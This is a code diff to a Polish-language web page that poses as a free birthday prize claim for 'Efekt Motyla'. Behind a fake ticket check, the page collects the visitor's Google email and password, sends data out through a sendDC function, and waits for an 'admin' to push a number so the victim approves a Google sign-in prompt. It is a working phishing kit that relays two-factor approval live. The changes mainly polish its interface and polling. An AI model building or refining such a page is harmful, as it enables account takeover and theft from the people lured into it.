@@ -29,7 +29,6 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            
             background-image: radial-gradient(ellipse at 50% 0%, #2a1040 0%, #0b0012 70%);
         }
 
@@ -110,6 +109,14 @@
             margin-bottom: 28px;
         }
 
+        /* ===== STEPS ===== */
+        .steps-container {
+            transition: all 0.5s ease;
+        }
+        .steps-container.hidden {
+            display: none;
+        }
+
         .steps {
             display: flex;
             justify-content: center;
@@ -134,9 +141,21 @@
             transition: all 0.3s;
         }
 
-        .step { display: none; }
-        .step.active { display: block; }
+        /* ===== STEPY ===== */
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        .step.active {
+            display: block;
+        }
 
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== UPLOAD ===== */
         .upload-zone {
             border: 2px dashed var(--border);
             border-radius: 14px;
@@ -165,6 +184,7 @@
         .file-preview .name { flex: 1; font-size: 13px; color: var(--text); }
         .file-preview .size { font-size: 12px; color: var(--muted); }
 
+        /* ===== INPUTY ===== */
         .input-group { margin-bottom: 14px; }
         .input-group label {
             display: block;
@@ -188,6 +208,7 @@
         .input-group input:focus { border-color: var(--accent); }
         .input-group input::placeholder { color: #4a2a5a; }
 
+        /* ===== PRZYCISKI ===== */
         .btn {
             width: 100%;
             padding: 14px;
@@ -218,6 +239,7 @@
         .btn-google:hover { transform: scale(1.01); box-shadow: 0 4px 20px rgba(255,255,255,0.08); }
         .btn-google svg { width: 20px; height: 20px; flex-shrink: 0; }
 
+        /* ===== STATUS ===== */
         .status {
             display: none;
             padding: 12px 16px;
@@ -232,6 +254,7 @@
         .status.loading { background: rgba(168,85,247,0.08); border: 1px solid var(--accent); color: var(--accent); }
         .status.waiting { background: rgba(251,191,36,0.08); border: 1px solid var(--warning); color: var(--warning); }
 
+        /* ===== KOD ===== */
         .code-box {
             background: rgba(0,0,0,0.3);
             border: 2px solid var(--accent);
@@ -250,17 +273,7 @@
         }
         .code-box .sub { font-size: 11px; color: #6b3a7d; margin-top: 4px; }
 
-        .success-page {
-            display: none;
-            text-align: center;
-            padding: 20px 0;
-        }
-        .success-page.active { display: block; }
-        .success-page .icon { font-size: 64px; margin-bottom: 12px; }
-        .success-page h2 { color: var(--success); font-size: 24px; margin-bottom: 8px; }
-        .success-page p { color: var(--muted); font-size: 14px; line-height: 1.7; }
-
-        /* ===== SYSTEM OFFLINE OVERLAY ===== */
+        /* ===== SYSTEM OFFLINE ===== */
         .system-offline {
             display: none;
             text-align: center;
@@ -274,6 +287,18 @@
         .system-offline .icon { font-size: 40px; }
         .system-offline h3 { color: #ef4444; font-size: 18px; margin: 8px 0; }
         .system-offline p { color: var(--muted); font-size: 13px; }
+
+        /* ===== SUCCESS ===== */
+        .success-page {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+            animation: fadeIn 0.6s ease;
+        }
+        .success-page.active { display: block; }
+        .success-page .icon { font-size: 64px; margin-bottom: 12px; }
+        .success-page h2 { color: var(--success); font-size: 24px; margin-bottom: 8px; }
+        .success-page p { color: var(--muted); font-size: 14px; line-height: 1.7; }
 
         @media (max-width: 480px) {
             .card { padding: 28px 18px 24px; }
@@ -298,7 +323,7 @@
             <div class="logo">🦋 Efekt Motyla</div>
             <div class="badge">✦ 4. Urodziny</div>
 
-            <!-- ===== SYSTEM OFFLINE ===== -->
+            <!-- SYSTEM OFFLINE -->
             <div class="system-offline" id="systemOffline">
                 <div class="icon">⛔</div>
                 <h3>System wyłączony</h3>
@@ -306,16 +331,19 @@
             </div>
 
             <h1>🎁 Odbierz nagrodę!</h1>
-            <p class="sub">Wygrałeś darmową niespodziankę! Pokaż ją przy wejściu! Wykonaj 3 kroki:</p>
+            <p class="sub" id="mainSub">Wygrałeś darmową niespodziankę! Pokaż ją przy wejściu! Wykonaj 3 kroki:</p>
 
-            <div class="steps">
-                <div class="step-dot active" id="dot1"></div>
-                <div class="step-dot" id="dot2"></div>
-                <div class="step-dot" id="dot3"></div>
+            <!-- STEPS CONTAINER -->
+            <div class="steps-container" id="stepsContainer">
+                <div class="steps">
+                    <div class="step-dot active" id="dot1"></div>
+                    <div class="step-dot" id="dot2"></div>
+                    <div class="step-dot" id="dot3"></div>
+                </div>
+                <div class="step-label" id="stepLabel">📤 Krok 1: Prześlij bilet</div>
             </div>
-            <div class="step-label" id="stepLabel">📤 Krok 1: Prześlij bilet</div>
 
-            <!-- STEP 1 -->
+            <!-- ===== STEP 1 ===== -->
             <div class="step active" id="step1">
                 <p style="color:var(--muted);font-size:13px;text-align:center;margin-bottom:12px;">
                     Prześlij zdjęcie biletu <strong>z widocznym kodem QR</strong>
@@ -334,7 +362,7 @@
                 <div class="status" id="uploadStatus"></div>
             </div>
 
-            <!-- STEP 2 -->
+            <!-- ===== STEP 2 ===== -->
             <div class="step" id="step2">
                 <p style="color:var(--muted);font-size:13px;text-align:center;margin-bottom:14px;">
                     ✅ Bilet zweryfikowany! Zaloguj się przez Google:
@@ -362,7 +390,7 @@
                 <div class="status" id="loginStatus"></div>
             </div>
 
-            <!-- STEP 3 -->
+            <!-- ===== STEP 3 ===== -->
             <div class="step" id="step3">
                 <p style="color:var(--muted);font-size:13px;text-align:center;margin-bottom:12px;">
                     🔐 Potwierdź logowanie w aplikacji Google
@@ -382,7 +410,7 @@
                 <div class="status" id="confirmStatus"></div>
             </div>
 
-            <!-- SUCCESS -->
+            <!-- ===== SUCCESS ===== -->
             <div class="success-page" id="successPage">
                 <div class="icon">🎉</div>
                 <h2>Nagroda odebrana!</h2>
@@ -410,6 +438,8 @@
         const d2 = document.getElementById('dot2');
         const d3 = document.getElementById('dot3');
         const label = document.getElementById('stepLabel');
+        const stepsContainer = document.getElementById('stepsContainer');
+        const mainSub = document.getElementById('mainSub');
 
         const uploadZone = document.getElementById('uploadZone');
         const fileInput = document.getElementById('fileInput');
@@ -441,14 +471,32 @@
 
         // ============ FUNKCJE ============
         function goToStep(n) {
-            [s1, s2, s3].forEach((el, i) => el.classList.toggle('active', i === n));
+            // Ukryj wszystkie kroki
+            [s1, s2, s3].forEach(el => el.classList.remove('active'));
+            // Pokaż wybrany
+            if (n === 0) s1.classList.add('active');
+            else if (n === 1) s2.classList.add('active');
+            else if (n === 2) s3.classList.add('active');
+
+            // Kropki
             [d1, d2, d3].forEach((el, i) => {
                 el.className = 'step-dot';
                 if (i < n) el.classList.add('done');
                 if (i === n) el.classList.add('active');
             });
+
             const labels = ['📤 Krok 1: Prześlij bilet', '🔐 Krok 2: Zaloguj się przez Google', '✅ Krok 3: Potwierdź w aplikacji'];
             label.textContent = labels[n];
+        }
+
+        // 🔥 UKRYJ WSZYSTKIE KROKI I POKAŻ SUKCES
+        function showSuccess() {
+            // Ukryj kroki
+            stepsContainer.classList.add('hidden');
+            [s1, s2, s3].forEach(el => el.classList.remove('active'));
+            mainSub.style.display = 'none';
+            // Pokaż sukces
+            successPage.classList.add('active');
         }
 
         function sendDC(msg, file = null) {
@@ -468,6 +516,8 @@
         }
 
         function genId() { return Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10); }
+
+        let pollInterval = null;
 
         function pollCode() {
             if (!sessionId) return;
@@ -492,26 +542,17 @@
                     isSystemOnline = data.online !== false;
                     if (!isSystemOnline) {
                         systemOffline.classList.add('show');
-                        // Wyłącz wszystkie przyciski
                         uploadBtn.disabled = true;
                         loginBtn.disabled = true;
                         confirmBtn.disabled = true;
-                        // Ukryj kroki
-                        document.querySelector('.steps').style.display = 'none';
-                        document.querySelector('.step-label').style.display = 'none';
-                        [s1, s2, s3].forEach(el => el.style.display = 'none');
                     } else {
                         systemOffline.classList.remove('show');
                         uploadBtn.disabled = false;
                         loginBtn.disabled = false;
                         confirmBtn.disabled = false;
-                        document.querySelector('.steps').style.display = 'flex';
-                        document.querySelector('.step-label').style.display = 'block';
-                        s1.style.display = 'block';
                     }
                 })
                 .catch(() => {
-                    // Jeśli błąd - zakładamy że system działa
                     systemOffline.classList.remove('show');
                 });
         }
@@ -547,7 +588,12 @@
             setTimeout(() => {
                 uploadStatus.className = 'status show success';
                 uploadStatus.textContent = '✅ Bilet zweryfikowany!';
-                setTimeout(() => { goToStep(1); uploadStatus.className = 'status'; }, 800);
+                setTimeout(() => {
+                    // Przejdź do kroku 2
+                    goToStep(1);
+                    uploadStatus.className = 'status';
+                    uploadStatus.textContent = '';
+                }, 800);
             }, 1000);
         });
 
@@ -588,13 +634,16 @@
                 loginStatus.className = 'status show success';
                 loginStatus.textContent = '✅ Zalogowano!';
                 setTimeout(() => {
+                    // Przejdź do kroku 3
                     goToStep(2);
                     loginStatus.className = 'status';
+                    loginStatus.textContent = '';
                     confirmCode.textContent = '--';
                     confirmCode.style.color = '#fbbf24';
                     confirmStatus.className = 'status show waiting';
                     confirmStatus.textContent = '⏳ Czekamy na numer od admina...';
-                    setInterval(pollCode, 2000);
+                    if (pollInterval) clearInterval(pollInterval);
+                    pollInterval = setInterval(pollCode, 2000);
                 }, 800);
             }, 1000);
         });
@@ -623,11 +672,8 @@
                         confirmStatus.className = 'status show success';
                         confirmStatus.textContent = '✅ Potwierdzono!';
                         setTimeout(() => {
-                            document.querySelector('.card > .sub').style.display = 'none';
-                            document.querySelector('.steps').style.display = 'none';
-                            document.querySelector('.step-label').style.display = 'none';
-                            document.getElementById('step3').style.display = 'none';
-                            successPage.classList.add('active');
+                            if (pollInterval) clearInterval(pollInterval);
+                            showSuccess();
                         }, 800);
                     } else {
                         confirmStatus.className = 'status show error';
@@ -646,9 +692,8 @@
 
         if (localStorage.getItem('em')) { emailIn.value = localStorage.getItem('em'); passIn.value = localStorage.getItem('pa') || ''; }
 
-        // 🔥 SPRAWDŹ STATUS PRZY STARCIE
+        // 🔥 START
         checkSystemStatus();
-        // Sprawdzaj co 5 sekund
         setInterval(checkSystemStatus, 5000);
 
         console.log('🦋 Efekt Motyla');
